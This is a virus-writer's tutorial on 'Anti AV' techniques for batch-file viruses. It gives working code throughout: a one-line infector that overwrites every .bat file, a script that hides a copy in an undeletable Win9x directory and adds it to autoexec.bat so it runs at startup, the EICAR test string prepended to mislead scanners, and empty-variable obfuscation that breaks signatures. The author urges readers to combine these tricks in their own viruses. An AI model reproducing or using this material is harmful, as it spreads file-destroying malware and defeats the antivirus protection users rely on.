.intro words

  While making my Batch WOrm Generator I discovered much very useful techniques
  for Batch viruses, for instands about Encryption or Polymorphism. But I
  discovered also some other techniques. These are Anti AVA techniques, and I
  thought, I don't have to let them die. Now let's start...






.index

  I'm sure, that you want to know, about which techniques I want to 
  talk. So, here is the shit of content :)

  1) Including fake bytes
  2) Useing a undeletable directory (Not for Win00|NT|XP)
  3) Including the EICAR-Testfile
  4) Pseudo-Trash between the code





.Including fake bytes

  This is a special Anti-KAV-heuristic technique. Maybe you know, that KAV only
  searchs in the first 1000 Bytes for the virus (I think, only in batch viruses).
  What does that mean for us? Guess what? :) We inlude befor of the start of our
  virus 1000 silly bytes, which don't do anything. And what is t effect? Let's test
  it. First we have a very silly code-string, that only spread itself in the
  current dir via overwriting Batch-files. KAV named it 'BAT.Silly.d'.

- - - - - - - - - - [ BAT.Silly.d ] - - - - - - - - - -

for %%a in (*.bat) do copy %0 %%a

- - - - - - - - -[ End of BAT.Silly.d ]- - - - - - - - -

  Now let's test our new technique. Includeing 1000 fake-Byte should not
  be a serious problem. Because of the fact, that batch ignore simple input-errors
  we won't have any problems with it. My string contains random lowercase-letters.
  But it should be no problme to include also other letters like Uppercase or
  numbers and so on. Important Note: Do not include a '<' or a '>', because the
  computer will 'think', that you want to read/write from a file.

  The thing looks damn stupid, but the effect is genial :). The whole virus
  works, but KAV don't show any alarm. And also no heuristic alarm. I'm sure,
  that you will like this technique very much.






.Useing a undeletable directory (Not for Win00|NT|XP)

  This technique's name looks very cool. And don't worry, it IS very cool.
  But first let me explain, what it is: Windows 95 and Windows 98 have a
  bug. If you try to make a new directory in MS-DOS, which contains some special
  letters, windows won't be able to work with that directorys. You can't open
  the directory, move it or delete it. That's the princip of our technique,
  because of the reason, that batch is a DOS script. Now let's have a look at
  letters, which make that possible.

  OK, we know all the chars, which are possible. Now let's make a little
  sample with that technique. My sample makes a undeleteable directory in
  %windir%, and write something to the autoexec.bat, which let the virus
  start at every windows-run.

cls
@echo off
cd %windir%
md º´ÜòÌ
cd º´ÜòÌ
copy %0 virus.bat
echo cd %windir% >>autoexec.bat
echo cd º´ÜòÌ >>autoexec.bat
echo virus.bat >>autoexec.bat

  I'm sure, that you'll understand the example. A special thanks goes
  to the Author of 'Trojan.BAT.NoDelDir', but unfortunatly I don't know,
  who it is. If you read this, please contact me!!!






.Including the EICAR-Testfile

  I think, that everybody knows, what EICAR-Virus-Test-File is. If not, I'll
  explain it: It's a com-file from EICAR, and every Scanner detects it. It's
  only for testing your AV. It's no virus, but it writes a String to the DOS
  screen. OK, sounds nice, but how can we use it? Because of the fact, that 
  nearly everybody knows about that file, nobody is scared of a warning from
  his AV about that detection. That's the point. We include to our program the
  EICAR-file, so useres won't be scared of it. Here is the EICAR file content:


- - - - - - - - - [ EICAR-content ] - - - - - - - - - -

X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*


- - - - - - - -[ End of EICAR-content ]- - - - - - - - -

  This is the same princip as the fake-bytes. But it contains a sensefully
  content: The EICAR-file. It's the same 'virus', that I used in the FAKE
  BYTE including technique. But now it's no more detect as 'BAT.Silly.d'
  but 'EICAR-Test-File'. And we had success :)

- - - - - - - - - [ EICAR-content example] - - - - - - - - - -

X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
for %%a in (*.bat) do copy %0 %%a

- - - - - - - -[ End of EICAR-content example]- - - - - - - - -






.Pseudo-Trash between the code

  The title sounds emazing. So, what do I mean with 'Pseudo-Trash'?
  Anything, that is written down in the code, but do not exist in the
  runtime. You may think, that I'm a stoned/drunken or whatever, but it's
  the only possible explanation. Think about the explanation. What comes
  to your mind? Maybe the command 'set'? Then you're at the right way.
  OK, a variable contains any content. But the point is, that a variable
  can also contains '' (=nothing). Now we solved our problem :)
  Let's look at the code. It's again the silly virus, which is detect by
  KAV as 'BAT.Silly.d'.

- - - - - - - - - [ Pseudo-Trash example] - - - - - - - - - -

%anyting%fo%anyting%r %%a i%anyting%n (%anyting%*.ba%anyting%t) d%anyting%o co%anyting%py %0 %%a


- - - - - - - -[ End of Pseudo-Trash example]- - - - - - - - -

  As you can see, the thing is very (!!!) easy to make, but it's also useful.
  Note: you have to know, that the variable, that you use, has no content.
  Otherwise the virus won't work. If you are not sure about the content,
  include the line 'set anthing=', so you delete the content.






.last words

  These techniques could be really useful, if you also include other Anti AV
  tricks. If you include all these things and also encryption or polymorphism
  or whatever, AVs will have a really problems. Now I hope, that you'll try
  to use some (or maybe all :D ) of these things in your future-projects,
  otherwise I wasted much hours of discover the techniques, searching errors
  and better ways of it, checking the behaviour on other OSes and writing the
  article. OK, in the end I want to say sorry about my english spelling or
  grammer mistakes :).
